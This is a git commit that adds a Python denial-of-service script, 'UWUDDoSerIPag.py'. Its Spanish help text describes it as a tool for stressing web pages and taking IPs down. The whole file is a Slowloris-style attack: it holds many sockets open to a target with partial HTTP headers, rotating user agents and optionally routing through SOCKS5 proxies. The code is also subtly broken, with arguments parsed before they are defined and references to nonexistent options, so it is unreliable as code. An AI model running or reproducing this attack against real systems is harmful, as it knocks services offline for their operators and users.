c06cbd502dec10ba6b8c3b971c792a5d1274ffdc
ClynexHacksPROGRAMMER <62680233+ClynexHacksPROGRAMMER@users.noreply.github.com>
2020-09-08 23:21:27 -0300

    Add files via upload

---
+++ UWUDDoSerIPag.py
@@ -0,0 +1,219 @@
+﻿import argparse
+import logging
+import random
+import socket
+import sys
+import time
+
+parser = argparse.ArgumentParser(
+    description="UWUDDoSerIPag, Unos de los mejores scripts para estresar paginas y tumbar ips"
+)
+print("\n\n\r")
+parser.add_argument("host", nargs="?", help="Esta es la pagina o la ip")
+print("\n\n")
+parser.add_argument(
+    "-p", "--port", default=80, help="Puerto del servidor, Default : 80", type=int
+)
+print("\n\n")
+arguments = parser.parse_args()
+parser.add_argument(
+    "-s",
+    "--threads",
+    default=150,
+    help="Numero de threads que se usaran",
+    type=int,
+)
+print("\n\n")
+parser.add_argument(
+    "-db", "--debug", dest="debug", action="store_true", help="Aumenta los logs a nivel DEBUG"
+)
+print("\n\n")
+parser.add_argument(
+    "-ua",
+    "--randuseragents",
+    dest="randuseragent",
+    action="store_true",
+    help="Randomiza los user-agent por peticion",
+)
+print("\n\n")
+parser.add_argument(
+    "-x",
+    "--useproxy",
+    dest="useproxy",
+    action="store_true",
+    help="Usa proxys SOCKS5 Para atacar",
+)
+laipxd = arguments.host
+print("\n\n")
+parser.add_argument("--proxy-host", default=laipxd, help="SOCKS5 proxy host")
+print("\n\n")
+parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
+print("\n\n")
+parser.add_argument(
+    "--https", dest="https", action="store_true", help="Usa HTTPS Para las peticiones"
+)
+parser.add_argument(
+    "--sleeptime",
+    dest="sleeptime",
+    default=15,
+    type=int,
+    help="Tiempo para que cada thread descanse.",
+)
+parser.set_defaults(debug=False)
+parser.set_defaults(randuseragent=False)
+parser.set_defaults(useproxy=False)
+parser.set_defaults(https=False)
+args = parser.parse_args()
+
+if len(sys.argv) <= 1:
+    parser.print_help()
+    sys.exit(1)
+
+if not args.host:
+    print("Host required!")
+    parser.print_help()
+    sys.exit(1)
+
+if args.useproxy:
+
+
+
+    try:
+        import socks
+
+        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
+        socket.socket = socks.socksocket
+        logging.info("Usando Proxys SOCKS5...")
+    except ImportError:
+        logging.error("Libreria de proxies no disponible!")
+
+if args.verbose:
+    logging.basicConfig(
+        format="[%(asctime)s] %(message)s",
+        datefmt="%d-%m-%Y %H:%M:%S",
+        level=logging.DEBUG,
+    )
+else:
+    logging.basicConfig(
+        format="[%(asctime)s] %(message)s",
+        datefmt="%d-%m-%Y %H:%M:%S",
+        level=logging.INFO,
+    )
+
+if args.https:
+    logging.info("* Importando modulo SSL *")
+    import ssl
+
+list_of_sockets = []
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.1; .NET CLR 1.1.4322)",
+    "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04 Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
+    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
+    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-cn) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16",
+    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
+    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+]
+
+
+def init_socket(ip):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    if args.https:
+        s = ssl.wrap_socket(s)
+
+    s.connect((ip, args.port))
+
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    if args.randuseragent:
+        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+    else:
+        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
+    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    return s
+
+
+def main():
+    ip = args.host
+    socket_count = args.sockets
+    logging.info("Atacando %s Con %s threads.", ip, socket_count)
+
+    logging.info("Creando threads...")
+    for _ in range(socket_count):
+        try:
+            logging.debug("%s Threads Creados", _)
+            s = init_socket(ip)
+        except socket.error as e:
+            logging.debug(e)
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        try:
+            logging.info(
+                "Enviando los headers vivos... Contador de threads: %s", len(list_of_sockets)
+            )
+            for s in list(list_of_sockets):
+                try:
+                    s.send(
+                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
+                    )
+                except socket.error:
+                    list_of_sockets.remove(s)
+
+            for _ in range(socket_count - len(list_of_sockets)):
+                logging.debug("Recreando thread...")
+                try:
+                    s = init_socket(ip)
+                    if s:
+                        list_of_sockets.append(s)
+                except socket.error as e:
+                    logging.debug(e)
+                    break
+            logging.debug("Durmiendo por %d segundos", args.sleeptime)
+            time.sleep(args.sleeptime)
+
+        except (KeyboardInterrupt, SystemExit):
+            logging.info("EXIT")
+            break
+
+
+if __name__ == "__main__":
+    main()
